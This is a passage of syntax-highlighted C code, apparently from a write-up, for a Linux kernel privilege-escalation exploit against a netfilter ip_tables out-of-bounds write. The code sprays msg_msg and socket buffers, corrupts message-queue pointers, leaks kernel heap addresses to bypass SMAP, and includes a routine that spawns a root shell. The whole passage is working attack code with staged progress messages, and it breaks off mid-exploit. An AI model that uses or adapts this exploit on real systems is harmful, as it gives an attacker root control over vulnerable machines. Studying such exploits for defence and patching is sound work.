class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line">  <span class="keyword">uint64_t</span> confirm;</span><br><span class="line">  <span class="keyword">uint64_t</span> release;</span><br><span class="line">  <span class="keyword">uint64_t</span> steal;</span><br><span class="line">  <span class="keyword">uint64_t</span> get;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">long</span> mtype;</span><br><span class="line">  <span class="keyword">char</span> mtext[PRIMARY_SIZE - MSG_MSG_SIZE];</span><br><span class="line">&#125; msg_primary;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">long</span> mtype;</span><br><span class="line">  <span class="keyword">char</span> mtext[SECONDARY_SIZE - MSG_MSG_SIZE];</span><br><span class="line">&#125; msg_secondary;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">long</span> mtype;</span><br><span class="line">  <span class="keyword">char</span> mtext[PAGE_SIZE - MSG_MSG_SIZE + PAGE_SIZE - MSG_MSGSEG_SIZE];</span><br><span class="line">&#125; msg_fake;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build_msg_msg</span><span class="params">(struct msg_msg *msg, <span class="keyword">uint64_t</span> m_list_next,</span></span></span><br><span class="line"><span class="params"><span class="function">                   <span class="keyword">uint64_t</span> m_list_prev, <span class="keyword">uint64_t</span> m_ts, <span class="keyword">uint64_t</span> next)</span> </span>&#123;</span><br><span class="line">  msg-&gt;m_list_next = m_list_next;</span><br><span class="line">  msg-&gt;m_list_prev = m_list_prev;</span><br><span class="line">  msg-&gt;m_type = MTYPE_FAKE;</span><br><span class="line">  msg-&gt;m_ts = m_ts;</span><br><span class="line">  msg-&gt;next = next;</span><br><span class="line">  msg-&gt;security = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getRootShell</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;failed to gain the root!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, esp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_eflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">write_msg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">const</span> <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span> </span>&#123;</span><br><span class="line">  *(<span class="keyword">long</span> *)msgp = msgtyp;</span><br><span class="line">  <span class="keyword">if</span> (msgsnd(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] msgsnd&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">peek_msg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), msgtyp, MSG_COPY | IPC_NOWAIT) &lt;</span><br><span class="line">      <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] msgrcv&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_msg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), msgtyp, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] msgrcv&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">spray_skbuff</span><span class="params">(<span class="keyword">int</span> ss[NUM_SOCKETS][<span class="number">2</span>], <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_SOCKETS; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; NUM_SKBUFFS; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (write(ss[i][<span class="number">0</span>], buf, size) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] write&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">free_skbuff</span><span class="params">(<span class="keyword">int</span> ss[NUM_SOCKETS][<span class="number">2</span>], <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_SOCKETS; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; NUM_SKBUFFS; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (read(ss[i][<span class="number">1</span>], buf, size) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] read&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">trigger_oob_write</span><span class="params">(<span class="keyword">int</span> s)</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span>((__<span class="title">packed__</span>)) &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipt_replace</span> <span class="title">replace</span>;</span>                     <span class="comment">// 0x60</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipt_entry</span> <span class="title">entry</span>;</span>                         <span class="comment">// 0x70</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_match</span> <span class="title">match</span>;</span>                    <span class="comment">// 0x20</span></span><br><span class="line">    <span class="keyword">char</span> pad[<span class="number">0x108</span> + PRIMARY_SIZE - <span class="number">0x200</span> - <span class="number">0x2</span>];   <span class="comment">//  kvmalloc_size = sizeof(xt_table_info) + ipt_replace-&gt;size =  0x40 + (0xFB8 - 0x2) = 0xFF8 - 0x2</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_target</span> <span class="title">target</span>;</span>                  <span class="comment">// 0x20</span></span><br><span class="line">  &#125; data = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  data.replace.num_counters = <span class="number">1</span>;</span><br><span class="line">  data.replace.num_entries = <span class="number">1</span>;</span><br><span class="line">  data.replace.size = (<span class="keyword">sizeof</span>(data.entry) + <span class="keyword">sizeof</span>(data.match) +</span><br><span class="line">                       <span class="keyword">sizeof</span>(data.pad) + <span class="keyword">sizeof</span>(data.target));             <span class="comment">// 0x70 + (0x108+0x1000-0x200-0x2) + 0x20 + 0x20 = 0xFB8 - 0x2</span></span><br><span class="line"></span><br><span class="line">  data.entry.next_offset = (<span class="keyword">sizeof</span>(data.entry) + <span class="keyword">sizeof</span>(data.match) +</span><br><span class="line">                            <span class="keyword">sizeof</span>(data.pad) + <span class="keyword">sizeof</span>(data.target));        <span class="comment">// Size of ipt_entry + matches + target</span></span><br><span class="line">  data.entry.target_offset =</span><br><span class="line">      (<span class="keyword">sizeof</span>(data.entry) + <span class="keyword">sizeof</span>(data.match) + <span class="keyword">sizeof</span>(data.pad));         <span class="comment">// Size of ipt_entry + matches</span></span><br><span class="line"></span><br><span class="line">  data.match.u.user.match_size = (<span class="keyword">sizeof</span>(data.match) + <span class="keyword">sizeof</span>(data.pad));   <span class="comment">// 0x20 + (0x108+0x1000-0x200-0x2) = 0xF28 - 0x2</span></span><br><span class="line">  <span class="built_in">strcpy</span>(data.match.u.user.name, <span class="string">&quot;icmp&quot;</span>);</span><br><span class="line">  data.match.u.user.revision = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  data.target.u.user.target_size = <span class="keyword">sizeof</span>(data.target);                     <span class="comment">// 0x20</span></span><br><span class="line">  <span class="built_in">strcpy</span>(data.target.u.user.name, <span class="string">&quot;NFQUEUE&quot;</span>);</span><br><span class="line">  data.target.u.user.revision = <span class="number">1</span>;</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Partially overwrite the adjacent buffer with 2 bytes of zero.</span></span><br><span class="line">  <span class="keyword">if</span> (setsockopt(s, SOL_IP, IPT_SO_SET_REPLACE, &amp;data, <span class="keyword">sizeof</span>(data)) != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (errno == ENOPROTOOPT) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-] Error ip_tables module is not loaded.\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setup_sandbox</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (unshare(CLONE_NEWUSER) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (unshare(CLONE_NEWNET) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] unshare(CLONE_NEWNET)&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//bind the cpu0</span></span><br><span class="line">  <span class="keyword">cpu_set_t</span> <span class="built_in">set</span>;</span><br><span class="line">  CPU_ZERO(&amp;<span class="built_in">set</span>);</span><br><span class="line">  CPU_SET(<span class="number">0</span>, &amp;<span class="built_in">set</span>);</span><br><span class="line">  <span class="keyword">if</span> (sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(<span class="built_in">set</span>), &amp;<span class="built_in">set</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] sched_setaffinity&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> s;</span><br><span class="line">  <span class="keyword">int</span> fd;</span><br><span class="line">  <span class="keyword">int</span> ss[NUM_SOCKETS][<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">int</span> pipefd[NUM_PIPEFDS][<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">int</span> msqid[NUM_MSQIDS];</span><br><span class="line">  <span class="keyword">uint64_t</span>    *rop_chain;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> primary_buf[PRIMARY_SIZE - SKB_SHARED_INFO_SIZE];</span><br><span class="line">  <span class="keyword">char</span> secondary_buf[SECONDARY_SIZE - SKB_SHARED_INFO_SIZE];</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">fake_pipe_buffer_ops</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">fake_pipe_buffer</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">uint64_t</span> pipe_buffer_ops = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">uint64_t</span> kheap_addr = <span class="number">0</span>, kbase_addr = <span class="number">0</span>, kernel_offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> fake_idx = <span class="number">-1</span>, real_idx = <span class="number">-1</span>;</span><br><span class="line">  saveStatus();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] STAGE 0: Initialization\033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Setting up namespace sandbox...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (setup_sandbox() &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_no_rmid;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Initializing sockets and message queues...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] socket&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> err_no_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_SOCKETS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, ss[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      perror(<span class="string">&quot;[-] socketpair&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> err_no_rmid;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 1. two bytes null write -&gt; UAF</span></span><br><span class="line"><span class="comment">// 1-1. gain 4096 msg queue</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_MSQIDS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, IPC_CREAT | <span class="number">0666</span>)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      perror(<span class="string">&quot;[-] msgget&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> err_no_rmid;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] STAGE 1: Memory corruption\033[0m\n&quot;</span>);</span><br><span class="line"><span class="comment">//1-2. create 4096 primary msg —— size=0x1000</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Spraying primary messages...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_MSQIDS; i++) &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;msg_primary, <span class="string">&#x27;\xdd&#x27;</span>, <span class="number">0x100</span>);</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;msg_primary.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;msg_primary.mtext[<span class="number">4</span>] = i;</span><br><span class="line">    <span class="keyword">if</span> (write_msg(msqid[i], &amp;msg_primary, <span class="keyword">sizeof</span>(msg_primary), MTYPE_PRIMARY) &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 1-3. create 4096 secondary msg —— size=0x400</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Spraying secondary messages...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_MSQIDS; i++) &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;msg_secondary, <span class="number">0</span>, <span class="keyword">sizeof</span>(msg_secondary));</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;msg_secondary.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;msg_secondary.mtext[<span class="number">4</span>] = i;</span><br><span class="line">    <span class="keyword">if</span> (write_msg(msqid[i], &amp;msg_secondary, <span class="keyword">sizeof</span>(msg_secondary),</span><br><span class="line">                  MTYPE_SECONDARY) &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 1-4. release #1024/#2048/#3072 msg</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Creating holes in primary messages...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = HOLE_STEP; i &lt; NUM_MSQIDS; i += HOLE_STEP) &#123;</span><br><span class="line">    <span class="keyword">if</span> (read_msg(msqid[i], &amp;msg_primary, <span class="keyword">sizeof</span>(msg_primary), MTYPE_PRIMARY) &lt;</span><br><span class="line">        <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 1-5. make xt_table_info struct take up the hole, and triger 2 bytes null write</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Triggering out-of-bounds write...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (trigger_oob_write(s) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1-6. find which msg is corrupted</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Searching for corrupted primary message...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_MSQIDS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i != <span class="number">0</span> &amp;&amp; (i % HOLE_STEP) == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (peek_msg(msqid[i], &amp;msg_secondary, <span class="keyword">sizeof</span>(msg_secondary), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> err_no_rmid;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;msg_secondary.mtext[<span class="number">0</span>] != MSG_TAG) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-] Error could not corrupt any primary message.\n&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> err_no_rmid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;msg_secondary.mtext[<span class="number">4</span>] != i) &#123;</span><br><span class="line">      fake_idx = i;</span><br><span class="line">      real_idx = *(<span class="keyword">int</span> *)&amp;msg_secondary.mtext[<span class="number">4</span>];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fake_idx == <span class="number">-1</span> &amp;&amp; real_idx == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Error could not corrupt any primary message.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> err_no_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// fake_idx&#x27;s primary message has a corrupted next pointer; wrongly pointing to real_idx&#x27;s secondary message.</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] fake_idx: 0x%x\n&quot;</span>, fake_idx);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] real_idx: 0x%x\n&quot;</span>, real_idx);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] STAGE 2: SMAP bypass\033[0m\n&quot;</span>);</span><br><span class="line"><span class="comment">// 2. leak secondary msg address (kmalloc-0x400) -&gt; to forge `msg_msg-&gt;m_list-&gt;next &amp; prev`</span></span><br><span class="line"><span class="comment">// 2-1. free overlapped msg</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Freeing real secondary message...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (read_msg(msqid[real_idx], &amp;msg_secondary, <span class="keyword">sizeof</span>(msg_secondary),</span><br><span class="line">               MTYPE_SECONDARY) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Reclaim the previously freed secondary message with a fake msg_msg of maximum possible size.</span></span><br><span class="line"><span class="comment">// 2-2. spray and forge msg_msg (forge larger msg_msg-&gt;m_ts)</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Spraying fake secondary messages...\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(secondary_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_buf));</span><br><span class="line">  build_msg_msg((<span class="keyword">void</span> *)secondary_buf, <span class="number">0x41414141</span>, <span class="number">0x42424242</span>,</span><br><span class="line">                PAGE_SIZE - MSG_MSG_SIZE, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (spray_skbuff(ss, secondary_buf, <span class="keyword">sizeof</span>(secondary_buf)) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"><span class="comment">// 2-2. leak heap pointer `msg_msg-&gt;m_list-&gt;prev` (kmalloc-0x1000)</span></span><br><span class="line">  <span class="comment">// Use the fake secondary message to read out-of-bounds.</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Leaking adjacent secondary message...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (peek_msg(msqid[fake_idx], &amp;msg_fake, <span class="keyword">sizeof</span>(msg_fake), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check if the leak is valid.</span></span><br><span class="line">  <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;msg_fake.mtext[SECONDARY_SIZE] != MSG_TAG) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Error could not leak adjacent secondary message.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// The secondary message contains a pointer to the primary message.</span></span><br><span class="line">  msg = (struct msg_msg *)&amp;msg_fake.mtext[SECONDARY_SIZE - MSG_MSG_SIZE];</span><br><span class="line">  kheap_addr = msg-&gt;m_list_next;</span><br><span class="line">  <span class="keyword">if</span> (kheap_addr &amp; (PRIMARY_SIZE - <span class="number">1</span>))</span><br><span class="line">    kheap_addr = msg-&gt;m_list_prev;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] kheap_addr: 0x%&quot;</span> PRIx64 <span class="string">&quot;\n&quot;</span>, kheap_addr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((kheap_addr &amp; <span class="number">0xFFFF000000000000</span>) != <span class="number">0xFFFF000000000000</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Error kernel heap address is incorrect.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 2-3. leak heap pointer `msg_msg-&gt;m_list-&gt;prev` (kmalloc-0x400)  (forge msg_msg-&gt;next)</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Freeing fake secondary messages...\n&quot;</span>);</span><br><span class="line">  free_skbuff(ss, secondary_buf, <span class="keyword">sizeof</span>(secondary_buf));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Put kheap_addr at next to leak its content. Assumes zero bytes before</span></span><br><span class="line">  <span class="comment">// kheap_addr.</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Spraying fake secondary messages...\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(secondary_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_buf));</span><br><span class="line">  build_msg_msg((<span class="keyword">void</span> *)secondary_buf, <span class="number">0x41414141</span>, <span class="number">0x42424242</span>,</span><br><span class="line">                <span class="keyword">sizeof</span>(msg_fake.mtext), kheap_addr - MSG_MSGSEG_SIZE);      <span class="comment">// fist 8 bytes must be NULL</span></span><br><span class="line">  <span class="keyword">if</span> (spray_skbuff(ss, secondary_buf, <span class="keyword">sizeof</span>(secondary_buf)) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Use the fake secondary message to read from kheap_addr.</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Leaking primary message...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (peek_msg(msqid[fake_idx], &amp;msg_fake, <span class="keyword">sizeof</span>(msg_fake), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check if the leak is valid.</span></span><br><span class="line">  <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;msg_fake.mtext[PAGE_SIZE] != MSG_TAG) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Error could not leak primary message.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// The primary message contains a pointer to the secondary message.</span></span><br><span class="line">  msg = (struct msg_msg *)&amp;msg_fake.mtext[PAGE_SIZE - MSG_MSG_SIZE];</span><br><span class="line">  kheap_addr = msg-&gt;m_list_next;</span><br><span class="line">  <span class="keyword">if</span> (kheap_addr &amp; (SECONDARY_SIZE - <span class="number">1</span>))</span><br><span class="line">    kheap_addr = msg-&gt;m_list_prev;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Calculate the address of the fake secondary message.</span></span><br><span class="line">  kheap_addr -= SECONDARY_SIZE;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] 